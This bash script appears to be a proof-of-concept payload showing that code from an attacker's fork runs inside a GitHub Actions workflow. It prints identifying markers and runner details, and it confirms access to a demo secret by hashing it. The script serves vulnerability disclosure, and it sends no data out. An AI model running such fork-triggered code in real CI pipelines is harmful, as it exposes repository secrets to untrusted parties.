#!/usr/bin/env bash
set -euo pipefail

echo "POC_MARKER=ATTACKER_FORK_CODE_EXECUTED"
echo "script_repository=StealthyBugs/actions-checkout-dotgit-poc-20261008"
echo "script_branch=poc/dotgit-alias"
echo "runner_user=$(id -un)"
echo "runner_os=${RUNNER_OS}"
echo "workflow_repository=${GITHUB_REPOSITORY}"
echo "workflow_event=${GITHUB_EVENT_NAME}"
echo "secret_present=$([[ -n "${TRIAGE_DEMO_SECRET:-}" ]] && echo true || echo false)"
printf 'secret_sha256='
printf '%s' "${TRIAGE_DEMO_SECRET:-}" | shasum -a 256 | awk '{print $1}'
